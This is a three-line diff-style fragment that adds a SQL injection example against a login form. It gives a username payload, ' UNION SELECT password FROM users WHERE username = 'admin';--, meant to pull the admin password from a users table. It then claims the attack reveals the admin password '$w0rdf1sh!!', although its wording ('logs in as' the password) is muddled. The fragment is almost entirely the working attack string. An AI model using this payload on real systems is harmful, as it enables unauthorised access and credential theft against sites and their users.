@@ -1,0 +1,3 @@
+username: ' UNION SELECT password FROM users WHERE username = 'admin';--
+password: <whatever>
+logs in as $w0rdf1sh!!, which is the password for admin
